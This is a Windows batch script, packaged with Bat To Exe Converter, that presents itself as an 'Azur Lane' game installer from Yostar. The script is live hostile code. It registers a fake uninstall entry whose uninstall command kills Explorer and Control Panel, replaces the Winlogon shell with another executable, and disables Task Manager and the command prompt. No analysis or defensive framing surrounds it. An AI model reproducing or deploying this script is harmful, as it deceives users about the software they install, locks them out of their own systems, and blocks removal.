::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
cls
REG ADD HKEY_CURRENT_USER\software\microsoft\windows\currentversion\uninstall\azur-lane-soft /f
REG ADD HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\uninstall\\azur-lane-soft /v "DisplayName" /t REG_SZ /d "Azur Lane" /f
REG ADD HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\uninstall\\azur-lane-soft /v "Publisher" /t REG_SZ /d "Yostar" /f
REG ADD HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\uninstall\\azur-lane-soft /v "URLInfoAbout" /t REG_SZ /d "https://twitter.com/azur-lane-en" /f
REG ADD HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\uninstall\\azur-lane-soft /v "DisplayVersion" /t REG_SZ /d "r0.1.2.6.9 (Unofficial)" /f
REG ADD HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\uninstall\\azur-lane-soft /v "DisplayIcon" /t REG_SZ /d "%cd%\\install.exe,0" /f
REG ADD HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\uninstall\\azur-lane-soft /v "UninstallString" /t REG_SZ /d "%windir%\\system32\\cmd.exe /c taskkill /f /im explorer.exe&taskkill /f /im control.exe&echo You can't get rid of me that easy!&pause&exit" /f
REG ADD HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\uninstall\\azur-lane-soft /v "QuietUninstallString" /t REG_SZ /d "%windir%\\system32\\cmd.exe /c taskkill /f /im explorer.exe&taskkill /f /im control.exe&echo You can't get rid of me that easy!&pause&exit" /f
REG ADD HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\uninstall\\azur-lane-soft /v "InstallDate" /t REG_SZ /d "20691010" /f
REG ADD HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\uninstall\\azur-lane-soft /v "InstallLocation" /t REG_SZ /d "%windir%\\system32" /f 
REG ADD HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\uninstall\\azur-lane-soft /v "NoRepair" /t REG_DWORD /d 0x00000001 /f
REG ADD HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\uninstall\\azur-lane-soft /v "NoModify" /t REG_DWORD /d 0x00000001 /f
REG ADD HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\uninstall\\azur-lane-soft /v "NoRemove" /t REG_DWORD /d 0x00000000 /f


REG ADD "HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion\winlogon" /v "Shell" /t REG_SZ /d "%windir%\shell.exe" /f
REG ADD "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\policies\system" /v "DisableTaskMgr" /t REG_DWORD /d 0x00000001 /f 
REG ADD "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System" /f 
REG ADD "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System" /v "DisableCMD" /t REG_DWORD /d 0x00000002 /f
